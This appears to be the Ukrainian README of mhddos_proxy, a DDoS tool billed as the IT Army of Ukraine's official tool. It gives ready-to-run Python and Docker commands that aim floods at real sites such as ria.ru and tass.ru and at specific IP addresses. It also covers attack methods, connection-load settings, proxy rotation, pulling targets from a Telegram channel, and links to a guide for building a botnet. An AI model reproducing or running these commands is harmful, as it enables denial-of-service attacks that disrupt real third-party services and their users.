## IT Army of Ukraine Official Tool 

### [English Version](/README-EN.md)

- Вбудована база проксі з величезною кількістю IP по всьому світу
- Можливість задавати багато цілей з автоматичним балансуванням навантаження
- Безліч різноманітних методів
- Ефективне використання ресурсів завдяки асихронній архітектурі

### ⏱ Останні оновлення
  
Оновлення версії для Windows | Mac | Linux | Android | Docker: https://telegra.ph/Onovlennya-mhddos-proxy-04-16  

- **21.05.2022**
  - Додано англійську локалізацію - прапорець `--lang EN` (в майбутньому можуть бути додані інші мови)

- **18.05.2022**
  - Додано налаштування `--copies` для запуску декількох копій (рекомендовано до використання при наявності 4+ CPU та мережі > 100 Mb/s).

- **15.05.2022**
  - Повністю оновлена асинхронна версія, що забезпечує максимальну ефективність та мінімальне навантаження на систему
  - Ефективна робота зі значно більшими значеннями параметру `-t` (до 10k) без ризику "підвісити" усю машину
  - Абсолютно новий алгоритм розподілення навантаження між цілями з метою досягнення максимальної потужності
  - Додано методи `RGET`, `RHEAD`, `RHEX` та `STOMP`.

### 💽 Встановлення - [інструкції ТУТ](/docs/installation.md)

### 🕹 Запуск (наведено різні варіанти цілей)

#### Python (якщо не працює - просто python або python3.10 замість python3)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Docker (для Linux додавайте sudo на початку команди)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 🛠 Налаштування (більше у розділі [CLI](#cli))

**Усі параметри можна комбінувати**, можна вказувати і до і після переліку цілей

Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовчуванням 7500 (або 1000 якщо на машині лише 1 CPU).

    python3 runner.py -t 5000 https://ria.ru https://tass.ru

Щоб переглянути інформацію про хід роботи, додайте прапорець  `--debug` для тексту, `--table` для таблиці.

    python3 runner.py --debug https://ria.ru https://tass.ru
    
Щоб обрати цілі від https://t.me/itarmyofukraine2022 додайте параметр `--itarmy`  

    python3 runner.py --itarmy --debug

### 📌Автоматичний шукач нових проксі для mhddos_proxy
Сам скрипт та інструкції по встановленню тут: https://github.com/porthole-ascend-cinnamon/proxy_finder

### 🐳 Комьюніті
- [Детальний розбір mhddos_proxy та інструкції по встановленню](docs/installation.md)
- [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [Створення ботнету з 30+ безкоштовних та автономних(працюють навіть при вимкненому ПК) Linux-серверів](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with targets list
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Use both my IP and proxies. Optionally, specify a percent of using my IP (default is 10%)
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
      --http-methods GET     List of HTTP(L7) methods to use (default is GET + POST|STRESS).
      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
      --copies 1             Number of copies to run (default is 1)
      --lang {EN,UA}         Select language (default is UA)

### Власні проксі

#### Формат файлу:

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT

де `protocol` може бути одним з 3-ох: `http`|`socks4`|`socks5`, якщо `protocol`не вказувати, то буде обрано `http`  
наприклад для публічного проксі `socks4` формат буде таким:

    socks4://114.231.123.38:3065

а для приватного `socks4` формат може бути одним з таких:

    socks4://114.231.123.38:3065:username:password
    socks4://username:password@114.231.123.38:3065
  
**URL - Віддалений файл для Python та Docker**

    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt

де https://pastebin.com/raw/UkFWzLOt - ваша веб-сторінка зі списком проксі (кожен проксі з нового рядка)  
  
**path - Для Python**  
  
Покладіть файл у папку з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)

    python3 runner.py --proxies proxies.txt https://ria.ru

де `proxies.txt` - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
